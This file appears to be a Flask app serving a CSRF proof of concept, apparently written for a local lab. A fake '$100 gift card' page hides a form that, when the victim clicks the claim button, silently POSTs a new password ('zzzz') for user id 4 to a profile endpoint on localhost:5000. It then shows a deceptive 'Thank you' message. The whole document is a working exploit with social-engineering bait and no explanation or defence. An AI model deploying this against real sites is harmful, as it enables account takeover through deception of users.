from flask import Flask, render_template_string
import os

app = Flask(__name__)

CSRF_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Win a Free Gift Card!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            text-align: center;
        }
        h1 {
            color: #e74c3c;
        }
        .prize-image {
            width: 300px;
            height: 200px;
            background-color: #f1c40f;
            margin: 20px auto;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 24px;
        }
        .btn {
            background-color: #e74c3c;
            color: white;
            padding: 12px 24px;
            border: none;
            border-radius: 4px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .btn:hover {
            background-color: #c0392b;
        }
        #status {
            margin-top: 20px;
            padding: 10px;
            display: none;
        }
        .success {
            background-color: #2ecc71;
            color: white;
        }
    </style>
</head>
<body>
    <h1>Congratulations! You've Been Selected!</h1>
    <div class="prize-image">$100 GIFT CARD</div>
        <input type="text" name="email" placeholder="Insert your email here">

    <h2>Click the button below to claim your $100 gift card!</h2>
    
    <button class="btn" id="claimButton">Claim Your Prize Now!</button>
    
    <div id="status"></div>
    
    <iframe name="hiddenFrame" style="display:none;"></iframe>
    <form id="csrfForm" action="http://localhost:5000/profile" method="POST" target="hiddenFrame" style="display:none;">
        <input type="hidden" name="id" value="4">
        <input type="hidden" name="new_password" value="zzzz">
    </form>

    <script>
        document.getElementById('claimButton').addEventListener('click', function() {
            this.textContent = 'Processing...';
            
            document.getElementById('csrfForm').submit();
            
            setTimeout(function() {
                const statusDiv = document.getElementById('status');
                statusDiv.innerHTML = '<h3>Thank you!</h3><p>Your gift card is being processed and will be sent to your email soon.</p>';
                statusDiv.style.display = 'block';
                statusDiv.className = 'success';
                document.getElementById('claimButton').style.display = 'none';
            }, 2000);
        });
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(CSRF_HTML)

if __name__ == '__main__':
    app.run(host='localhost', port=8080, debug=True)